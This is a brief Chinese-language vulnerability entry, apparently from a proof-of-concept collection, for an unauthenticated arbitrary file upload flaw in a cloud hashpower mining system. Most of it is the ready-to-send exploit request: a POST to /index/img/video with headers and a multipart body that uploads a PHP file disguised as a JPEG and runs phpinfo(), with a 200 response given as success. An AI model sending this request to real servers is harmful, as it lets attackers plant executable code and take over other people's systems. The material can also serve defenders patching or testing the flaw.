# 中科存储矿机云算力矿机系统video存在前台任意文件上传漏洞

- **系统**：中科存储矿机云算力矿机系统　|　**类型**：文件上传　|　**CVE**：—
- **请求**：`POST /index/img/video HTTP/1.1`
- **关键头**：`Content-Length: 197`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryhdhJ2F7a…`　`Cookie: PHPSESSID=s334lbov97uu5foeq4ffgqsn1d`　`Host: 127.0.0.1:81`　`sec-fetch-user: ?1`

**请求体 / payload**
```
------WebKitFormBoundary03rNBzFMIytvpWhy
Content-Disposition: form-data; name="video"; filename="1.php"
Content-Type: image/jpeg
<?php phpinfo();?>
------WebKitFormBoundary03rNBzFMIytvpWhy--
```
- **预期**：200　|　—